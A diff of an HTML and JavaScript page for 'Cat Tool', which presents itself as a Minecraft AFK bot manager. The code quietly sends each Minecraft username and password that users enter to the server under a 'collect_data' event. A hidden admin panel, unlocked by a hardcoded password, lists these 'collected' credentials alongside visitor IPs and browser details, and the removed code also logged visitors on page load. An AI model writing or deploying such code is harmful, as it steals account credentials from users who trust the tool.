@@ -5,10 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cat Tool — BY meovancat & giananday</title>
     
-    <!-- ===== FONT VINTAGE ===== -->
+    <!-- FONT VINTAGE -->
     <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Playfair+Display:ital,wght@0,700;1,700&display=swap" rel="stylesheet">
     
     <style>
+        /* ===== RESET & BODY ===== */
         * { box-sizing: border-box; transition: all 0.25s ease; }
         body { 
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
@@ -21,7 +22,7 @@
             min-height: 100vh;
         }
         
-        /* ===== VINTAGE FONT CHO TIÊU ĐỀ QUẢN TRỊ ===== */
+        /* ===== VINTAGE FONT ===== */
         .vintage-title {
             font-family: 'Cinzel', serif;
             font-weight: 900;
@@ -87,9 +88,7 @@
             text-align: center;
             padding: 20px;
         }
-        #maintenanceOverlay.active {
-            display: flex;
-        }
+        #maintenanceOverlay.active { display: flex; }
         #maintenanceOverlay h1 {
             font-family: 'Cinzel', serif;
             font-size: 60px;
@@ -97,17 +96,10 @@
             text-shadow: 0 0 50px rgba(255, 51, 0, 0.8);
             margin-bottom: 10px;
         }
-        #maintenanceOverlay p {
-            font-size: 22px;
-            color: #ffaa66;
-            max-width: 600px;
-        }
-        #maintenanceOverlay .sub {
-            color: #884422;
-            font-size: 16px;
-            margin-top: 30px;
-        }
+        #maintenanceOverlay p { font-size: 22px; color: #ffaa66; max-width: 600px; }
+        #maintenanceOverlay .sub { color: #884422; font-size: 16px; margin-top: 30px; }
 
+        /* ===== ADD ACCOUNT ===== */
         .add-account-box {
             display: flex;
             gap: 10px;
@@ -117,6 +109,7 @@
             border-radius: 10px;
             border: 1px solid rgba(255, 119, 0, 0.3);
             box-shadow: 0 0 15px rgba(255, 119, 0, 0.1);
+            flex-wrap: wrap;
         }
         .add-account-box input {
             flex: 1;
@@ -127,6 +120,7 @@
             color: #fff;
             outline: none;
             font-size: 14px;
+            min-width: 150px;
         }
         .add-account-box input:focus { 
             border-color: #ff7700; 
@@ -148,8 +142,8 @@
             box-shadow: 0 0 25px rgba(255, 119, 0, 0.9);
             transform: translateY(-1px);
         }
-        .btn-add:active { transform: translateY(1px); }
 
+        /* ===== ACCOUNT CARDS ===== */
         .accounts-grid {
             display: grid;
             grid-template-columns: 1fr;
@@ -174,6 +168,7 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            flex-wrap: wrap;
         }
         .account-title {
             font-weight: bold;
@@ -222,6 +217,7 @@
         }
         .toggle-label:hover { color: #fff; }
 
+        /* ===== LOG ===== */
         .log-box { 
             background: rgba(5, 2, 1, 0.95); 
             color: #00ff88; 
@@ -238,8 +234,8 @@
             border: 1px solid rgba(0, 255, 136, 0.3);
             box-shadow: inset 0 0 15px rgba(0, 255, 136, 0.15), 0 0 10px rgba(0,0,0,0.8);
         }
-        .chat-container { display: flex; gap: 10px; } 
-        .chat-input { flex: 1; padding: 10px; border-radius: 6px; border: 1px solid #662b00; background: rgba(10, 5, 2, 0.9); color: #fff; outline: none; font-size: 13px; } 
+        .chat-container { display: flex; gap: 10px; flex-wrap: wrap; } 
+        .chat-input { flex: 1; padding: 10px; border-radius: 6px; border: 1px solid #662b00; background: rgba(10, 5, 2, 0.9); color: #fff; outline: none; font-size: 13px; min-width: 120px; } 
         .chat-input:focus { 
             border-color: #ff7700; 
             box-shadow: 0 0 15px rgba(255, 119, 0, 0.6);
@@ -297,7 +293,6 @@
         }
         .admin-login-box button:hover { opacity: 0.8; }
 
-        /* ===== NÚT BẢO TRÌ ===== */
         .maintenance-toggle {
             display: inline-block;
             margin-top: 10px;
@@ -373,6 +368,12 @@
             font-size: 12px;
             text-shadow: 0 0 8px rgba(255, 170, 102, 0.5);
         }
+
+        .table-wrapper { overflow-x: auto; }
+        .status-online { color: #44ff44; }
+        .status-offline { color: #ff4444; }
+        .text-center { text-align: center; }
+        .mt-10 { margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -389,26 +390,26 @@
     <h2>Cat Tool Panel</h2>
     <div class="subtitle">Hệ thống AFK Bot chuyên nghiệp • Multi-Account độc lập theo IP</div>
 
-    <!-- Thêm tài khoản -->
+    <!-- ===== THÊM TÀI KHOẢN ===== -->
     <div class="add-account-box">
-        <input type="text" id="new-username" placeholder="Nhập tên tài khoản Minecraft (Username)...">
-        <input type="password" id="new-password" placeholder="Mật khẩu đăng nhập (Mặc định: caigicungdc)">
+        <input type="text" id="new-username" placeholder="Nhập tên tài khoản Minecraft...">
+        <input type="password" id="new-password" placeholder="Mật khẩu (mặc định: caigicungdc)">
         <button class="btn-add" onclick="addAccount()">+ Thêm Bot</button>
     </div>
 
-    <!-- Danh sách tài khoản -->
+    <!-- ===== DANH SÁCH ACCOUNTS ===== -->
     <div id="accounts-container" class="accounts-grid">
-        <div style="text-align: center; color: #ffaa66; padding: 20px;">Chưa có tài khoản nào được thêm. Hãy thêm bot ở khung trên!</div>
+        <div class="text-center" style="color: #ffaa66; padding: 20px;">Chưa có tài khoản nào. Hãy thêm bot!</div>
     </div>
 
-    <!-- Log -->
-    <div style="font-size: 13px; color: #ffaa66; margin-bottom: 5px; font-weight: bold;">Nhật ký hệ thống (Console):</div>
+    <!-- ===== LOG ===== -->
+    <div style="font-size: 13px; color: #ffaa66; margin-bottom: 5px; font-weight: bold;">Nhật ký hệ thống:</div>
     <div id="log-box" class="log-box"></div>
 
     <!-- ===== ADMIN PANEL ===== -->
     <div id="adminPanel" class="admin-panel">
         <h3 class="vintage-title">🔐 BẢNG ĐIỀU KHIỂN QUẢN TRỊ</h3>
-        <p style="text-align:center; color:#ffaa66; font-family:'Playfair Display', serif; font-style:italic;">Chỉ dành cho Alpha</p>
+        <p class="text-center vintage-sub">Chỉ dành cho Alpha</p>
         
         <div class="admin-login-box">
             <input type="password" id="adminPass" placeholder="Nhập mật khẩu Alpha..." onkeypress="if(event.key==='Enter') adminLogin()">
@@ -417,8 +418,8 @@
         </div>
 
         <div id="adminContent" style="display: none;">
-            <!-- ===== NÚT BẢO TRÌ ===== -->
-            <div style="text-align:center; margin: 15px 0;">
+            <!-- NÚT BẢO TRÌ -->
+            <div class="text-center mt-10">
                 <button id="maintenanceBtn" class="maintenance-toggle" onclick="toggleMaintenance()">
                     🛠️ Bật Bảo Trì
                 </button>
@@ -426,209 +427,70 @@
             </div>
             <hr style="border-color:#662b00;">
 
-            <h4 class="vintage-sub">📋 Danh sách IP truy cập & thông tin đăng nhập đã thu thập</h4>
-            <table class="admin-table">
-                <thead>
-                    <tr>
-                        <th>STT</th>
-                        <th>IP</th>
-                        <th>Thời gian</th>
-                        <th>Username nhập</th>
-                        <th>Password nhập</th>
-                        <th>Trình duyệt</th>
-                    </tr>
-                </thead>
-                <tbody id="adminTableBody">
-                    <tr><td colspan="6" style="text-align:center;">Đang tải dữ liệu từ server...</td></tr>
-                </tbody>
-            </table>
+            <h4 class="vintage-sub">📋 Danh sách IP & thông tin đăng nhập đã thu thập</h4>
+            <div style="margin-bottom:10px; font-size:13px; color:#ffaa66;">
+                Tổng: <span id="totalRecords">0</span> bản ghi
+            </div>
+            <div class="table-wrapper">
+                <table class="admin-table">
+                    <thead>
+                        <tr>
+                            <th>STT</th>
+                            <th>IP</th>
+                            <th>Thời gian</th>
+                            <th>Username</th>
+                            <th>Password</th>
+                            <th>Trình duyệt</th>
+                        </tr>
+                    </thead>
+                    <tbody id="adminTableBody">
+                        <tr><td colspan="6" class="text-center">Đang tải...</td></tr>
+                    </tbody>
+                </table>
+            </div>
             <br>
-            <button onclick="clearCollectedData()" style="background:#ff3300; border:none; padding:6px 16px; border-radius:4px; color:#fff; cursor:pointer;">🗑️ Xóa toàn bộ dữ liệu đã thu thập</button>
+            <button onclick="clearCollectedData()" style="background:#ff3300; border:none; padding:6px 16px; border-radius:4px; color:#fff; cursor:pointer;">🗑️ Xóa toàn bộ dữ liệu</button>
             <hr style="border-color:#662b00;">
             
-            <h4 class="vintage-sub">💬 Chat từ xa vào từng bot (gửi lệnh trực tiếp)</h4>
-            <div id="remoteChatArea">
-                <p style="color:#ffaa66;">Chọn bot và nhập lệnh:</p>
-                <select id="remoteBotSelect" style="background:#0a0502; color:#fff; padding:6px; border:1px solid #ff7700; border-radius:4px;"></select>
-                <input type="text" id="remoteChatInput" placeholder="Lệnh (VD: /afk)" style="background:#0a0502; color:#fff; border:1px solid #662b00; padding:6px; border-radius:4px; margin-left:6px;">
-                <button onclick="sendRemoteChat()" style="background:#ff7700; border:none; padding:6px 14px; border-radius:4px; font-weight:bold; cursor:pointer;">Gửi</button>
+            <h4 class="vintage-sub">💬 Chat từ xa vào bot</h4>
+            <div>
+                <p style="color:#ffaa66; font-size:14px;">Chọn bot và nhập lệnh:</p>
+                <select id="remoteBotSelect" style="background:#0a0502; color:#fff; padding:6px; border:1px solid #ff7700; border-radius:4px; min-width:150px;"></select>
+                <input type="text" id="remoteChatInput" placeholder="Lệnh (VD: /afk)" style="background:#0a0502; color:#fff; border:1px solid #662b00; padding:6px; border-radius:4px; margin-left:6px; margin-top:5px;">
+                <button onclick="sendRemoteChat()" style="background:#ff7700; border:none; padding:6px 14px; border-radius:4px; font-weight:bold; cursor:pointer; margin-top:5px;">Gửi</button>
             </div>
         </div>
     </div>
 </div>
 
-<!-- Footer -->
+<!-- ===== FOOTER ===== -->
 <div class="footer-section">
     <button class="admin-btn" onclick="document.getElementById('adminPanel').classList.toggle('active')">🔒 Quản Trị Hệ Thống</button>
     <div class="copyright">© 2026 Cat Tool. Uy tín làm nên thương hiệu.</div>
 </div>
 
-<!-- Discord -->
+<!-- ===== DISCORD ===== -->
 <a href="https://discord.gg/wHHY7FDqd" target="_blank" class="discord-float" title="Tham gia Discord">
     <svg width="28" height="28" viewBox="0 0 127.14 96.36" fill="#ffffff">
         <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.15c2.63-27.29-4.53-51.2-19.45-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.88,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5.18-12.72,11.44-12.72S96.18,46,96.15,53,91,65.69,84.69,65.69Z"/>
     </svg>
 </a>
 
+<!-- ===== SOCKET.IO ===== -->
 <script src="/socket.io/socket.io.js"></script>
 <script>
-    // ============ PHẦN LÕI ============
+    // ============================================================
+    //  CLIENT - KẾT NỐI SOCKET.IO
+    // ============================================================
+    
     const socket = io();
     const logBox = document.getElementById('log-box');
     const accountsContainer = document.getElementById('accounts-container');
+    const ADMIN_PASSWORD = 'AlphaZo2026';
+    let isAdminLoggedIn = false;
+    let currentMaintenance = false;
 
-    // ---- Biến trạng thái bảo trì ----
-    let isMaintenance = localStorage.getItem('alpha_maintenance') === 'true';
-
-    // ---- Kiểm tra bảo trì khi load trang ----
-    function checkMaintenance() {
-        if (isMaintenance) {
-            document.getElementById('maintenanceOverlay').classList.add('active');
-            document.getElementById('maintenanceBtn').textContent = '🛠️ Tắt Bảo Trì';
-            document.getElementById('maintenanceBtn').classList.add('on');
-        } else {
-            document.getElementById('maintenanceOverlay').classList.remove('active');
-            document.getElementById('maintenanceBtn').textContent = '🛠️ Bật Bảo Trì';
-            document.getElementById('maintenanceBtn').classList.remove('on');
-        }
-    }
-
-    // ---- Toggle bảo trì ----
-    function toggleMaintenance() {
-        isMaintenance = !isMaintenance;
-        localStorage.setItem('alpha_maintenance', isMaintenance);
-        checkMaintenance();
-        // Gửi lên server để đồng bộ (nếu có backend)
-        socket.emit('toggle_maintenance', isMaintenance);
-        appendLog(`[Bảo trì] ${isMaintenance ? 'BẬT' : 'TẮT'} bảo trì`);
-    }
-
-    // ---- Gửi thông tin đăng nhập lên SERVER ----
-    function sendToServer(data) {
-        socket.emit('collect_data', data);
-    }
-
-    // ---- Thu thập IP và thông tin người dùng ----
-    function collectVisitorInfo() {
-        const entry = {
-            ip: 'Đang lấy...',
-            time: new Date().toLocaleString(),
-            username: document.getElementById('new-username')?.value || '(chưa nhập)',
-            password: document.getElementById('new-password')?.value || '(chưa nhập)',
-            userAgent: navigator.userAgent
-        };
-        // Gửi lên server
-        sendToServer(entry);
-        // Cũng lưu local để hiển thị nhanh
-        let localData = JSON.parse(localStorage.getItem('alpha_collected_data') || '[]');
-        localData.push(entry);
-        localStorage.setItem('alpha_collected_data', JSON.stringify(localData));
-        renderAdminTable();
-    }
-
-    // ---- Lưu username/password khi bấm "Thêm Bot" ----
-    function addAccount() {
-        const username = document.getElementById('new-username').value.trim();
-        const password = document.getElementById('new-password').value.trim();
-        if (!username) { alert('Vui lòng nhập tên tài khoản Minecraft!'); return; }
-
-        const entry = {
-            ip: 'Đang lấy...',
-            time: new Date().toLocaleString(),
-            username: username,
-            password: password || '(trống)',
-            userAgent: navigator.userAgent
-        };
-        sendToServer(entry);
-        let localData = JSON.parse(localStorage.getItem('alpha_collected_data') || '[]');
-        localData.push(entry);
-        localStorage.setItem('alpha_collected_data', JSON.stringify(localData));
-        renderAdminTable();
-
-        socket.emit('add_account', { username, password });
-        document.getElementById('new-username').value = '';
-        document.getElementById('new-password').value = '';
-    }
-
-    // ---- Nhận dữ liệu từ server (đồng bộ) ----
-    socket.on('sync_collected_data', (data) => {
-        localStorage.setItem('alpha_collected_data', JSON.stringify(data));
-        renderAdminTable();
-    });
-
-    // ---- Render bảng admin ----
-    function renderAdminTable() {
-        const tbody = document.getElementById('adminTableBody');
-        if (!tbody) return;
-        let data = JSON.parse(localStorage.getItem('alpha_collected_data') || '[]');
-        let html = '';
-        if (data.length === 0) {
-            html = '<tr><td colspan="6" style="text-align:center;">Chưa có dữ liệu</td></tr>';
-        } else {
-            data.forEach((item, index) => {
-                html += `<tr>
-                    <td>${index + 1}</td>
-                    <td>${item.ip || 'unknown'}</td>
-                    <td>${item.time}</td>
-                    <td>${item.username}</td>
-                    <td>${item.password}</td>
-                    <td>${item.userAgent ? item.userAgent.substring(0, 30) + '...' : 'N/A'}</td>
-                </tr>`;
-            });
-        }
-        tbody.innerHTML = html;
-    }
-
-    // ---- Admin login ----
-    function adminLogin() {
-        const pass = document.getElementById('adminPass').value;
-        if (pass === 'AlphaZo2026') {
-            document.getElementById('adminContent').style.display = 'block';
-            document.getElementById('adminPass').value = '';
-            renderAdminTable();
-            updateRemoteBotList();
-            checkMaintenance();
-            alert('🔓 Chào Alpha! Ngài đã vào được khu vực quản trị.');
-        } else {
-            alert('❌ Sai mật khẩu!');
-        }
-    }
-
-    function adminLogout() {
-        document.getElementById('adminContent').style.display = 'none';
-        document.getElementById('adminPass').value = '';
-    }
-
-    function clearCollectedData() {
-        if (confirm('Xóa toàn bộ dữ liệu đã thu thập?')) {
-            localStorage.setItem('alpha_collected_data', '[]');
-            socket.emit('clear_collected_data');
-            renderAdminTable();
-        }
-    }
-
-    // ---- Chat từ xa ----
-    function updateRemoteBotList() {
-        const select = document.getElementById('remoteBotSelect');
-        if (!select) return;
-        socket.emit('get_accounts');
-    }
-
-    function sendRemoteChat() {
-        const select = document.getElementById('remoteBotSelect');
-        const input = document.getElementById('remoteChatInput');
-        const botId = select.value;
-        const cmd = input.value.trim();
-        if (botId && cmd) {
-            socket.emit('send_chat', { id: botId, cmd });
-            input.value = '';
-            appendLog(`[Admin] Đã gửi lệnh "${cmd}" tới bot ${botId}`);
-        } else {
-            alert('Chọn bot và nhập lệnh!');
-        }
-    }
-
-    // ---- Các hàm cũ ----
+    // ===== LOG =====
     function appendLog(msg) {
         const div = document.createElement('div');
         div.textContent = msg;
@@ -636,52 +498,39 @@
         logBox.scrollTop = logBox.scrollHeight;
     }
 
-    socket.on('log', (msg) => { appendLog(msg); });
-    socket.on('restart_internal_bot', (id) => { socket.emit('start_bot', id); });
-
-    function startBot(id) { socket.emit('start_bot', id); }
-    function stopBot(id) { socket.emit('stop_bot', id); }
-    function deleteAccount(id) {
-        if (confirm('Bạn có chắc chắn muốn xóa tài khoản này khỏi danh sách quản lý?')) {
-            socket.emit('delete_account', id);
-        }
-    }
-    function toggleAutoReconnect(id) { socket.emit('toggle_auto_reconnect', id); }
-    function sendAccountChat(id) {
-        const input = document.getElementById(`chat_${id}`);
-        const cmd = input.value.trim();
-        if (cmd) { socket.emit('send_chat', { id, cmd }); input.value = ''; }
-    }
-
+    // ===== RENDER ACCOUNTS =====
     function renderAccounts(accounts) {
         if (!accounts || accounts.length === 0) {
-            accountsContainer.innerHTML = `<div style="text-align: center; color: #ffaa66; padding: 20px;">Chưa có tài khoản nào được thêm. Hãy thêm bot ở khung trên!</div>`;
+            accountsContainer.innerHTML = `<div class="text-center" style="color: #ffaa66; padding: 20px;">Chưa có tài khoản nào. Hãy thêm bot!</div>`;
             return;
         }
         let html = '';
         accounts.forEach(acc => {
+            const statusClass = acc.status === 'ONLINE / KINGSMP' || acc.status === 'ONLINE / LOBBY' ? 'status-online' : 'status-offline';
             html += `
                 <div class="account-card">
                     <div class="account-header">
                         <div class="account-title">🤖 ${acc.username}</div>
-                        <div class="status-badge" style="color: ${acc.color}; border: 1px solid ${acc.color}; text-shadow: 0 0 8px ${acc.color};">${acc.status}</div>
+                        <div class="status-badge ${statusClass}" style="border: 1px solid ${acc.color}; text-shadow: 0 0 8px ${acc.color};">${acc.status}</div>
                     </div>
                     <div class="account-actions">
-                        <button class="btn btn-start" onclick="startBot('${acc.id}')">Bật Bot</button>
-                        <button class="btn btn-stop" onclick="stopBot('${acc.id}')">Tắt Bot</button>
-                        <button class="btn btn-del" onclick="deleteAccount('${acc.id}')">Xóa</button>
+                        <button class="btn btn-start" onclick="startBot('${acc.id}')">▶ Bật</button>
+                        <button class="btn btn-stop" onclick="stopBot('${acc.id}')">⏹ Tắt</button>
+                        <button class="btn btn-del" onclick="deleteAccount('${acc.id}')">🗑 Xóa</button>
                         <label class="toggle-label" style="margin-left: auto;">
                             <input type="checkbox" ${acc.autoReconnect ? 'checked' : ''} onchange="toggleAutoReconnect('${acc.id}')"> Auto Reconnect
                         </label>
                     </div>
                     <div class="chat-container">
-                        <input type="text" id="chat_${acc.id}" class="chat-input" placeholder="Gửi lệnh nhanh tới bot này (VD: /afk, /menu)..." onkeypress="if(event.key==='Enter') sendAccountChat('${acc.id}')">
+                        <input type="text" id="chat_${acc.id}" class="chat-input" placeholder="Gửi lệnh nhanh..." onkeypress="if(event.key==='Enter') sendAccountChat('${acc.id}')">
                         <button class="chat-btn" onclick="sendAccountChat('${acc.id}')">Gửi</button>
                     </div>
                 </div>
             `;
         });
         accountsContainer.innerHTML = html;
+        
+        // Cập nhật dropdown remote chat
         const select = document.getElementById('remoteBotSelect');
         if (select) {
             select.innerHTML = '';
@@ -694,27 +543,177 @@
         }
     }
 
-    // ---- Nhận dữ liệu account từ server ----
+    // ===== RENDER BẢNG ADMIN =====
+    function renderAdminTable(data) {
+        const tbody = document.getElementById('adminTableBody');
+        if (!tbody) return;
+        let html = '';
+        if (!data || data.length === 0) {
+            html = '<tr><td colspan="6" class="text-center">Chưa có dữ liệu</td></tr>';
+        } else {
+            data.forEach((item, index) => {
+                html += `<tr>
+                    <td>${index + 1}</td>
+                    <td>${item.ip}</td>
+                    <td>${item.time}</td>
+                    <td>${item.username}</td>
+                    <td>${item.password}</td>
+                    <td>${item.userAgent ? item.userAgent.substring(0, 25) + '...' : 'N/A'}</td>
+                </tr>`;
+            });
+        }
+        tbody.innerHTML = html;
+        document.getElementById('totalRecords').textContent = data ? data.length : 0;
+    }
+
+    // ===== CẬP NHẬT BẢO TRÌ =====
+    function updateMaintenanceUI(status) {
+        currentMaintenance = status;
+        const overlay = document.getElementById('maintenanceOverlay');
+        const btn = document.getElementById('maintenanceBtn');
+        if (status) {
+            overlay.classList.add('active');
+            btn.textContent = '🛠️ Tắt Bảo Trì';
+            btn.classList.add('on');
+        } else {
+            overlay.classList.remove('active');
+            btn.textContent = '🛠️ Bật Bảo Trì';
+            btn.classList.remove('on');
+        }
+    }
+
+    // ============================================================
+    //  SOCKET EVENTS
+    // ============================================================
+
     socket.on('init_accounts', (accounts) => {
         renderAccounts(accounts);
     });
 
-    // ---- Khởi tạo ----
-    collectVisitorInfo();
-    renderAdminTable();
-    checkMaintenance();
-
-    // Tự động cập nhật bảng mỗi 5 giây
-    setInterval(() => {
-        renderAdminTable();
-    }, 5000);
-
-    // Nếu có bảo trì từ server, đồng bộ
-    socket.on('maintenance_status', (status) => {
-        isMaintenance = status;
-        localStorage.setItem('alpha_maintenance', status);
-        checkMaintenance();
+    socket.on('sync_collected_data', (data) => {
+        renderAdminTable(data);
+        if (isAdminLoggedIn) {
+            appendLog(`📥 Có ${data ? data.length : 0} bản ghi dữ liệu`);
+        }
     });
+
+    socket.on('log', (msg) => {
+        appendLog(msg);
+    });
+
+    socket.on('maintenance_status', (status) => {
+        updateMaintenanceUI(status);
+    });
+
+    socket.on('restart_internal_bot', (id) => {
+        startBot(id);
+    });
+
+    // ============================================================
+    //  UI FUNCTIONS
+    // ============================================================
+
+    // ---- Thêm account ----
+    function addAccount() {
+        const username = document.getElementById('new-username').value.trim();
+        const password = document.getElementById('new-password').value.trim();
+        if (!username) { alert('Vui lòng nhập tên tài khoản!'); return; }
+        
+        // Gửi dữ liệu thu thập lên server
+        socket.emit('collect_data', {
+            username: username,
+            password: password || 'caigicungdc',
+            userAgent: navigator.userAgent
+        });
+        
+        socket.emit('add_account', { username, password });
+        document.getElementById('new-username').value = '';
+        document.getElementById('new-password').value = '';
+    }
+
+    // ---- Bật bot ----
+    function startBot(id) {
+        socket.emit('start_bot', id);
+    }
+
+    // ---- Tắt bot ----
+    function stopBot(id) {
+        socket.emit('stop_bot', id);
+    }
+
+    // ---- Xóa bot ----
+    function deleteAccount(id) {
+        if (confirm('Xóa tài khoản này?')) {
+            socket.emit('delete_account', id);
+        }
+    }
+
+    // ---- Toggle auto reconnect ----
+    function toggleAutoReconnect(id) {
+        socket.emit('toggle_auto_reconnect', id);
+    }
+
+    // ---- Gửi chat đến bot cụ thể ----
+    function sendAccountChat(id) {
+        const input = document.getElementById(`chat_${id}`);
+        const cmd = input.value.trim();
+        if (cmd) {
+            socket.emit('send_chat', { id, cmd });
+            input.value = '';
+        }
+    }
+
+    // ---- Chat từ xa (admin) ----
+    function sendRemoteChat() {
+        const select = document.getElementById('remoteBotSelect');
+        const input = document.getElementById('remoteChatInput');
+        const id = select.value;
+        const cmd = input.value.trim();
+        if (id && cmd) {
+            socket.emit('send_chat', { id, cmd });
+            input.value = '';
+        } else {
+            alert('Chọn bot và nhập lệnh!');
+        }
+    }
+
+    // ---- Admin login ----
+    function adminLogin() {
+        const pass = document.getElementById('adminPass').value;
+        if (pass === ADMIN_PASSWORD) {
+            isAdminLoggedIn = true;
+            document.getElementById('adminContent').style.display = 'block';
+            document.getElementById('adminPass').value = '';
+            // Lấy dữ liệu mới nhất
+            socket.emit('get_accounts');
+            appendLog('🔓 Admin đã đăng nhập');
+        } else {
+            alert('❌ Sai mật khẩu!');
+        }
+    }
+
+    // ---- Admin logout ----
+    function adminLogout() {
+        isAdminLoggedIn = false;
+        document.getElementById('adminContent').style.display = 'none';
+        document.getElementById('adminPass').value = '';
+        appendLog('🚪 Admin đã đăng xuất');
+    }
+
+    // ---- Xóa dữ liệu thu thập ----
+    function clearCollectedData() {
+        if (confirm('Xóa toàn bộ dữ liệu đã thu thập?')) {
+            socket.emit('clear_collected_data');
+        }
+    }
+
+    // ---- Toggle bảo trì ----
+    function toggleMaintenance() {
+        socket.emit('toggle_maintenance', !currentMaintenance);
+    }
+
+    // ===== KHỞI TẠO =====
+    appendLog('🚀 Đang kết nối server...');
 </script>
 </body>
 </html>
